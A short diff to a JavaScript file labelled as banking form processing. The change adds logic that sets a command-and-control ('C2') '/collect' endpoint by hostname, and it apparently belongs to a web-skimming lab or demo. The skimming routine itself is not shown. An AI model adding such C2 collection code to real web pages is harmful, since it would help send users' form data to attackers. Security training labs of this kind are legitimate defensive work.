@@ -795,8 +795,17 @@
   console.log('[Banking] Initializing form processing handlers...')
 
   // Processing configuration
+  // Dynamically determine C2 URL based on environment
+  const hostname = window.location.hostname
+  let apiUrl = 'http://localhost:9004/collect' // Local development default
+
+  // Production and staging - use relative URL since C2 is proxied by nginx
+  if (hostname.includes('run.app') || hostname.includes('pcioasis.com')) {
+    apiUrl = window.location.origin + '/collect'
+  }
+
   const PROCESSING_CONFIG = {
-    apiUrl: 'http://localhost:9004/collect',
+    apiUrl: apiUrl,
     processingDelay: 100,
     debug: true
   }
